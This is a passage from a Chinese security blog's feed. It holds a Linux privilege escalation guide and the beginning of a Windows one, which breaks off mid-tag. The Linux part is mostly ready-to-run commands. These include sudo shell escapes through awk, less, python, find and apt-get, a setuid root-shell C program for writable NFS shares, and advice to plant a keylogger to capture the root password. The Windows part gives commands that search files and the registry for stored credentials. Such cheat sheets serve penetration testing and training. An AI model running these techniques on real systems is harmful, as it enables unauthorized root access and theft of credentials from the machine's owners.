href="https://blog.csdn.net/ldzm_edu/article/details/78893721" target="_blank" rel="noopener">vmware中ubuntu虚拟机扩容</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>linux权限提升</title>
      <link href="/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      <content type="html"><![CDATA[<p><img src="/2017/10/10/linux权限提升/linuxprivilegeescalation.jpg" alt=""></p><h2 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h2><ul><li>当我们获取到一个低权限的shell的时候，我们往往需要提升权限，以方便后面任意读写任意文件、权限维持等操作。</li><li>这篇文章中我们主要介绍一些常见的linux的权限提升的技巧，这其中包括<br>1.内核提权<br>2.以root权限运行的程序<br>3.已安装的软件<br>4.弱口令和明文密码<br>5.内部的服务<br>6.suid的错误配置<br>7.滥用sudo权限<br>8.以root权限运行的脚本文件<br>9.错误的路径配置<br>10.计划任务<h2 id="枚举脚本"><a href="#枚举脚本" class="headerlink" title="枚举脚本"></a>枚举脚本</h2></li><li>我之前用这三个脚本来枚举linux机器的基本信息，这三个脚本略有不同，但输出都很相似，所以选择一个你喜欢的就可以。<br><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a></li><li>以下是基本的选项：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-k Enter keyword</span><br><span class="line">-e Enter export location</span><br><span class="line">-t Include thorough (lengthy) tests</span><br><span class="line">-r Enter report name</span><br><span class="line">-h Displays this help text</span><br></pre></td></tr></table></figure></li></ul><p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank" rel="noopener">Unix privesc</a><br><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" target="_blank" rel="noopener">Linprivchecker.py</a><br><strong>这篇文章总结的比较全了</strong><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">Basic Linux Privilege Escalation</a></p><ul><li>或许你不想用脚本，那么可以主要关注以下方面的信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.系统信息  unmae -a,env,whoami,hsitory,pwd</span><br><span class="line">2.还有谁登陆了或者登陆过这个系统  who,w,last</span><br><span class="line">3.当前用户是否在sudoers 文件里 sudo -l ,cat /etc/sudoers</span><br><span class="line">4.是否有其它超级用户 grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos;</span><br><span class="line">5.查看一下网络信息  ifconfig -a,netstat -antlp,lsof -i</span><br><span class="line">6.查看运行的服务和进程 ps aux ,ps -ef</span><br></pre></td></tr></table></figure></li></ul><h2 id="以root权限运行的服务或程序"><a href="#以root权限运行的服务或程序" class="headerlink" title="以root权限运行的服务或程序"></a>以root权限运行的服务或程序</h2><ul><li>这个方法的原理就是如果一个服务是以root权限运行的，那么让这个服务去执行命令，那么执行的这个命令也将会是以root权限运行的，查看web服务器、数据库或者其它的服务，典型的例子然是<br>mysql的，如下：</li><li>查看有哪些正在运行的程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Metasploit</span><br><span class="line">ps</span><br><span class="line"># Linux</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure></li></ul><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><ul><li>如果你发现mysql是以root权限运行的，登录到mysql然后试试执行下面的命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&apos;whoami&apos;);</span><br><span class="line">select sys_eval(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></li></ul><p>如果这个不行可以使用UDF进行提权.<a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="noopener">UDF提权</a></p><h2 id="用户安装的软件"><a href="#用户安装的软件" class="headerlink" title="用户安装的软件"></a>用户安装的软件</h2><ul><li><p>用户安装的第三方软件是否是存在漏洞，如果有的话可以google一下exploit。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 常见的安装软件目录</span><br><span class="line">/usr/local/</span><br><span class="line">/usr/local/src</span><br><span class="line">/usr/local/bin</span><br><span class="line">/opt/</span><br><span class="line">/home</span><br><span class="line">/var/</span><br><span class="line">/usr/src/</span><br><span class="line"></span><br><span class="line"># Debian</span><br><span class="line">dpkg -l</span><br><span class="line"></span><br><span class="line"># CentOS, OpenSuse, Fedora, RHEL</span><br><span class="line">rpm -qa (CentOS / openSUSE )</span><br><span class="line"></span><br><span class="line"># OpenBSD, FreeBSD</span><br><span class="line">pkg_info</span><br></pre></td></tr></table></figure></li><li><p>然后查找对应的软件是否有漏洞并查找对应的exploit。</p><h2 id="弱口令或者明文密码"><a href="#弱口令或者明文密码" class="headerlink" title="弱口令或者明文密码"></a>弱口令或者明文密码</h2></li><li>检查一下web服务器连接数据库的配置文件(例如config.php)</li><li>检查一下数据库的管理员密码，密码可能被重用。</li><li><p>检测一下弱口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username:username</span><br><span class="line">username:username1</span><br><span class="line">username:root</span><br><span class="line">username:admin</span><br><span class="line">username:qwerty</span><br><span class="line">username:password</span><br></pre></td></tr></table></figure></li><li><p>检查一下明文密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Anything interesting the the mail?</span><br><span class="line">/var/spool/mail</span><br><span class="line"></span><br><span class="line">./LinEnum.sh -t -k password</span><br></pre></td></tr></table></figure></li><li><p>检查一下 ~/.ssh 文件夹 以及其它用户的.ssh目录。</p></li><li>检查一下 ~/.bash_history文件 以及其它用户的.bash_history文件。<br><img src="/2017/10/10/linux权限提升/Configuration.png" alt=""><h2 id="只能内部访问的服务"><a href="#只能内部访问的服务" class="headerlink" title="只能内部访问的服务"></a>只能内部访问的服务</h2></li><li>一些服务可能只是对内开放，外部是访问不了的，比如说部署服务器、数据库或者其它，这些服务可以是以root权限运行的，这些服务恰恰有可能存在漏洞，因为开发者或者用户可能会认为因为服务只是内部使用所以就放松了警惕。</li><li>使用netstat对比一下nmap的扫描结果<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">netstat -anlp</span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/10/linux权限提升/exim.png" alt=""></p><h2 id="suid和guid错误配置"><a href="#suid和guid错误配置" class="headerlink" title="suid和guid错误配置"></a>suid和guid错误配置</h2><ul><li>查找suid和guid的文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Find SUID</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">#Find GUID</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li></ul><h2 id="滥用sudo权限"><a href="#滥用sudo权限" class="headerlink" title="滥用sudo权限"></a>滥用sudo权限</h2><ul><li>如果你的shell可以通过sudo去访问某些程序且无需密码(通过sudo -l,或者查看/etc/sudoers文件)，这个时候就有可能进行提权，例如你可以sudo cp，那么就可以覆盖/etc/shadow 或者/etc/sudoers</li><li>这些命令有 awk、bash、cp等</li><li><p>awk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure></li><li><p>more<br><img src="/2017/10/10/linux权限提升/more.png" alt=""></p></li><li>less<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/shadow</span><br><span class="line">v</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/10/linux权限提升/less.png" alt=""></p><ul><li>nmap<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">低版本的nmap3.x 有interactive模式，且设置了suid，这个时候可以进入交互模式 执行!sh 命令即可轻松完成提权。</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/10/linux权限提升/nmaproot.png" alt=""></p><ul><li>python<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/10/linux权限提升/python.png" alt=""><br><img src="/2017/10/10/linux权限提升/sudoabuse.png" alt=""></p><ul><li>find <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -exec sh -i \;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/10/linux权限提升/find.png" alt=""></p><ul><li><p>其它 apt-get/yum/dpkg </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::=”/bin/bash -i”</span><br></pre></td></tr></table></figure></li><li><p>总而言之就是NOPASSWORD的程序都需要特别关注。</p></li><li>此外还有一个sudo_inject工具，进行进程注入，但是条件比较苛刻，1.需要有ptrace 2.需要有一个有效sudo token的进程。<a href="https://github.com/nongiach/sudo_inject" target="_blank" rel="noopener">工具地址</a><br><a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="noopener">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration</a><br><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="noopener">how-i-got-root-with-sudo</a><br><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" target="_blank" rel="noopener">Linux Restricted Shell Bypass</a><br><a href="https://touhidshaikh.com/blog/?p=790" target="_blank" rel="noopener">Abusing SUDO (Linux Privilege Escalation)</a></li><li>国外有人还专门做了一个类似的网站用来整理一些可以exploit或者绕过系统安全限制的程序列表及方法 <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a><h2 id="以root权限运行的脚本文件"><a href="#以root权限运行的脚本文件" class="headerlink" title="以root权限运行的脚本文件"></a>以root权限运行的脚本文件</h2></li><li>如果你发现一个脚本是root所有但是可以被任何用户写，这时你就可以添加你恶意的代码到这脚本中从而实现提权操作。其中最常见的是计划任务脚本。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#World writable files directories</span><br><span class="line">find / -writable -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># World executable folder</span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># World writable and executable folders</span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li></ul><h2 id="错误的路径配置"><a href="#错误的路径配置" class="headerlink" title="错误的路径配置"></a>错误的路径配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   这个trick不是很常见。</span><br><span class="line">首先这个需要受害者“错误”配置了 PATH这个环境变量，我们知道我们要在当前路径下执行某个可执行文件比如run.sh,我们需要输入 ./run.sh，有些管理员为了方便，可能会在PATH中添加.来避免输入./,这样只输入run.sh 就可以执行了。设想有这个一个场景，黑客A（低权限）和用户B（高权限），而用户B正好就设置了我们如上所说的变量，那么A可以将他的恶意程序命令为ls，而当B在进入到这个目录，并且使用ls命令查看文件属性的时候，恶意文件就会以B用户的权限去执行。这个有点儿像是欺骗攻击。</span><br></pre></td></tr></table></figure><p><a href="https://hackmag.com/security/reach-the-root/" target="_blank" rel="noopener">更多1</a><br><a href="http://www.dankalia.com/tutor/01005/0100501004.htm" target="_blank" rel="noopener">更多2</a></p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><ul><li>查看属于高权限用户但是你有写权限的文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure></li></ul><h2 id="NFS共享"><a href="#NFS共享" class="headerlink" title="NFS共享"></a>NFS共享</h2><ul><li><p>如果远程服务器开启了NFS共享，这个时候可以挂在远程共享服务磁盘，例如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount 192.168.1.101:/ /tmp/</span><br></pre></td></tr></table></figure></li><li><p>而如果这里的文件是root用户创建的，且你是可写可执行的，那么你就可以修改这个文件，然后去执行。</p></li><li>恶意代码可能是这样的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="通过键盘记录仪窃取密码"><a href="#通过键盘记录仪窃取密码" class="headerlink" title="通过键盘记录仪窃取密码"></a>通过键盘记录仪窃取密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果你有sudo权限 但是你没有密码的时候你可以安装个键盘记录仪，去记录root用户输入的密码。</span><br></pre></td></tr></table></figure><h2 id="其它有用的和提权相关的东西"><a href="#其它有用的和提权相关的东西" class="headerlink" title="其它有用的和提权相关的东西"></a>其它有用的和提权相关的东西</h2><ul><li>所有人可写的目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/tmp</span><br><span class="line">/var/tmp</span><br><span class="line">/dev/shm</span><br><span class="line">/var/spool/vbox</span><br><span class="line">/var/spool/samba</span><br></pre></td></tr></table></figure></li></ul><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><ul><li>最后万不得已，才使用内核提权，内核提权有风险，操作需谨慎。</li><li>利用linux的内核漏洞有时可以提权，但需要提前测试内核explicit是否对当前的系统、架构以及内核版本是有效的。</li><li>查看系统、架构、内核版本命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure></li></ul><h3 id="查找exploit"><a href="#查找exploit" class="headerlink" title="查找exploit"></a>查找exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:exploit-db.com kernel version</span><br><span class="line"></span><br><span class="line">python linprivchecker.py extended</span><br><span class="line"></span><br><span class="line">#search exploit for linux kernel 2.6 </span><br><span class="line">searchsploit kernel 2.6 linux | sort -n</span><br></pre></td></tr></table></figure><p><img src="/2017/10/10/linux权限提升/linuxkernalexploit.png" alt=""><br><strong>其中dirty-cow脏牛可以搞定大多的内核！！</strong><br><img src="/2017/10/10/linux权限提升/cow.png" alt=""></p><ul><li>能不用内核漏洞提权尽量就不要用，虽然内核提权是最快且最容易的，但因为它可能会导致系统崩溃或使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中。<br><strong>注意！！！在进行内核提权的时候先查看一下大概的代码以及原理，并且在本地最好做一下测试</strong><h2 id="提权工具"><a href="#提权工具" class="headerlink" title="提权工具"></a>提权工具</h2><a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="noopener">unix-privesc-check</a><br><a href="https://github.com/bcoles/kernel-exploits" target="_blank" rel="noopener">Various kernel exploits</a><h3 id="linux提权实操环境"><a href="#linux提权实操环境" class="headerlink" title="linux提权实操环境"></a>linux提权实操环境</h3><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489960&amp;idx=1&amp;sn=ae35c8e5eb5e08e713cfd204b71a6b9d&amp;chksm=fc1e8e7ecb6907685255c77713c7a99b4acdc223db736f1610202b84ac8467335b6b076286b9&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1567157743318&amp;sharer_shareid=f03c6e14fd46540b4a58dc4fc29ad18f%23rd" target="_blank" rel="noopener">in.security 提权靶场通关手册上篇</a><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://attack.mitre.org/techniques/T1134/" target="_blank" rel="noopener">ATT&amp;CK Privilege Escalation</a><br><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="noopener">guide-linux-privilege-escalation</a><br><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html" target="_blank" rel="noopener">privilege<em>escalation</em>-_linux</a><br><a href="http://bobao.360.cn/learning/detail/4512.html" target="_blank" rel="noopener">Linux提权——利用可执行文件SUID</a><br><a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="noopener">https://github.com/sagishahar/lpeworkshop</a><br><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="noopener">A guide to Linux Privilege Escalation</a><br><a href="https://www.youtube.com/watch?v=-i4O_hjc87Y" target="_blank" rel="noopener">nmap提权</a><br><a href="https://www.youtube.com/watch?v=dk2wsyFiosg" target="_blank" rel="noopener">Its Too Funky In Here04 Linux privilege escalation for fun profit and all around mischief </a><br><a href="https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref" target="_blank" rel="noopener">linux提权实战</a><br><a href="https://www.prodefence.org/privilege-escalation-cheatsheet-vulnhub/" target="_blank" rel="noopener">Privilege Escalation Cheatsheet</a><br>!!! <a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="noopener">提权环境-以上</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>windows权限提升(二)</title>
      <link href="/2017/10/01/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E4%BA%8C)/"/>
      <url>/2017/10/01/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E4%BA%8C)/</url>
      <content type="html"><![CDATA[<p><img src="/2017/10/01/windows权限提升(二)/windowsprivilegeescalation.png" alt=""></p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li>A privilege is the right of an account, such as a user or group account, to perform various system-related operations on the local computer, such as shutting down the system, loading device drivers, or changing the system time” (msdn.microsoft.com)</li><li>首先来说说windows权限提升对于攻击者来说有哪些好处<br>1.可以尝试更多的攻击手法<br>2.可以获取到本地用户的哈希<br>3.可以在网络层进行LLMNR、NBNS投毒等<br>4.本地抓包<br>5.安装软件<br>6.可以从内存中获取明文的认证信息</li><li>当然本篇文章只是有关单台windows的提权，提权有时还包含内环境的情况，就是从一个普通域用户提权到域管理员用户，这种情况暂不在本文讨论范畴。</li><li>20200208更新-发现好笔记一处,比我的文章全。。。<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener">Windows - Privilege Escalation</a><h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2></li><li>在提权之前我们首先需要对这个系统需要有一定的了解，比如需要知道当前用户有哪些权限、系统打了哪些补丁等信息。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># Basics</span><br><span class="line">systeminfo</span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line"># Who am I?</span><br><span class="line">whoami</span><br><span class="line">echo %username%</span><br><span class="line"></span><br><span class="line"># What users/localgroups are on the machine?</span><br><span class="line">net users</span><br><span class="line">net localgroups</span><br><span class="line"></span><br><span class="line"># More info about a specific user. Check if user has privileges.</span><br><span class="line">net user user1</span><br><span class="line"></span><br><span class="line"># View Domain Groups</span><br><span class="line">net group /domain</span><br><span class="line"></span><br><span class="line"># View Members of Domain Group</span><br><span class="line">net group /domain &lt;Group Name&gt;</span><br><span class="line"></span><br><span class="line"># Firewall</span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line"># Network</span><br><span class="line">ipconfig /all</span><br><span class="line">route print</span><br><span class="line">arp -A</span><br><span class="line"></span><br><span class="line"># How well patched is the system?</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; - to find specific KBs</span><br></pre></td></tr></table></figure></li></ul><h2 id="明文密码存储"><a href="#明文密码存储" class="headerlink" title="明文密码存储"></a>明文密码存储</h2><h3 id="通过以下的命令进行查找"><a href="#通过以下的命令进行查找" class="headerlink" title="通过以下的命令进行查找"></a>通过以下的命令进行查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">findstr /si password *.txt</span><br><span class="line">findstr /si password *.xml</span><br><span class="line">findstr /si password *.ini</span><br><span class="line"></span><br><span class="line">#Find all those strings in config files.</span><br><span class="line">dir /s *pass* == *cred* == *vnc* == *.config*</span><br><span class="line"></span><br><span class="line"># Find all passwords in all files.</span><br><span class="line">findstr /spin &quot;password&quot; *.*</span><br><span class="line">findstr /spin &quot;password&quot; *.*</span><br><span class="line"></span><br><span class="line"># Find Browser Creds</span><br><span class="line">enum_ie,enum_chrome(metasploit)</span><br><span class="line"></span><br><span class="line"># SessionGopher - find Putty,winscp,RDP creds</span><br><span class="line">[SessionGopher](https://github.com/Arvanaghi/SessionGopher)</span><br></pre></td></tr></table></figure><h3 id="关键文件查找"><a href="#关键文件查找" class="headerlink" title="关键文件查找"></a>关键文件查找</h3><ul><li>在这些常见的文件中查找，其中有些可能是base64编码的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c:\users\xxx\Desktop\password.xls</span><br><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">c:\unattend.xml</span><br><span class="line">%WINDIR%\Panther\Unattend\Unattended.xml</span><br><span class="line">%WINDIR%\Panther\Unattended.xml</span><br><span class="line"></span><br><span class="line">dir c:\*vnc.ini /s /b</span><br><span class="line">dir c:\*ultravnc.ini /s /b </span><br><span class="line">dir c:\ /s /b | findstr /si *vnc.ini</span><br><span class="line">此外还有可能是域环境中的group policy文件</span><br><span class="line">C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml • \\????\SYSVOL\\Policies\????\Machine\Preferences\Groups\Groups.xml</span><br><span class="line">![](grouppolicyfile.png)</span><br></pre></td></tr></table></figure></li></ul><h3 id="注册表查找"><a href="#注册表查找" class="headerlink" title="注册表查找"></a>注册表查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Windows autologin</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultUsername</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultPassword</span><br><span class="line"></span><br><span class="line"># SNMP Paramters</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line"></span><br><span class="line"># Putty</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42</span><br><span class="line">-v ProxyUsername</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42</span><br><span class="line">-v ProxyPassword</span><br><span class="line"></span><br><span class="line">#vnc</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly</span><br><span class="line"></span><br><span class="line"># Search for password in registry</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="仅对内网提供的服务"><a href="#仅对内网提供的服务" class="headerlink" 